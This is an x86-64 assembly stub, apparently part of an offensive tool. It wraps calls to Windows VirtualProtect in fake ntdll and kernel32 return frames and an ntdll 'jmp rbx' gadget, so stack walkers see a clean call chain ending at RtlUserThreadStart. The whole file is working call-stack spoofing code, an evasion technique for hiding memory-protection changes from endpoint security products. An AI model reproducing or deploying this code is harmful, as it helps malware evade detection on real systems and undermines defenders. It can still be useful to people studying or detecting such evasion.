/*
 * spoof_stub.S — asm side of the VirtualProtect call-stack spoof.
 * mingw64 GAS, Intel syntax. See spoof.c for the design writeup.
 */

    .intel_syntax noprefix
    .text
    .globl  spoof_call

/*
 * extern __attribute__((sysv_abi)) LONG spoof_call(
 *     void *fn, void *a1, SIZE_T a2, DWORD a3, void *a4);
 *
 * SysV entry:  rdi=fn  rsi=a1  rdx=a2  rcx=a3  r8=a4   [rsp]=real_ret
 * Win64 wants: rcx=a1  rdx=a2  r8=a3   r9=a4
 */
spoof_call:
    /* Stash real return + rbx (single caller — see ponytail note). */
    pop     rax
    mov     qword ptr [rip + g_saved_ret], rax
    mov     qword ptr [rip + g_saved_rbx], rbx

    /* rbx = trampoline; gadget's `jmp rbx` lands there after VP returns. */
    lea     rbx, [rip + spoof_trampoline]

    /* SysV → Win64 arg shuffle. */
    mov     r10, rdi                /* r10 = fn                       */
    mov     r11, rcx                /* save a3 (rcx about to be a1)   */
    mov     rcx, rsi                /* a1                             */
    /* rdx = a2 already */
    mov     r9,  r8                 /* a4                             */
    mov     r8,  r11                /* a3                             */

    /* Fake grandparent (ntdll) and kernel32 frames — walker climbs
     * these looking for the topmost user module and terminates cleanly
     * on RtlUserThreadStart, the canonical thread-entry frame. */
    push    qword ptr [rip + g_frame_ntdll]
    push    qword ptr [rip + g_frame_kernel32]

    /* Win64 shadow space (mandatory 32B home for rcx/rdx/r8/r9). */
    sub     rsp, 32

    /* Fake immediate return: ntdll `jmp rbx` gadget. VP's `ret` pops
     * this into RIP; gadget then routes control to rbx (= trampoline). */
    push    qword ptr [rip + g_ntdll_gadget]

    jmp     r10                     /* enter VirtualProtect          */

spoof_trampoline:
    /* VP's `ret` popped the gadget slot (8B). Layout now:
     *   [rsp+0..31]  = shadow (32B)
     *   [rsp+32]     = kernel32 fake frame
     *   [rsp+40]     = ntdll fake frame                              */
    add     rsp, 48

    /* Restore rbx, then jump to real caller. rax holds VP's return
     * value throughout (gadget's jmp and this trampoline never touch it). */
    mov     rbx, qword ptr [rip + g_saved_rbx]
    jmp     qword ptr [rip + g_saved_ret]
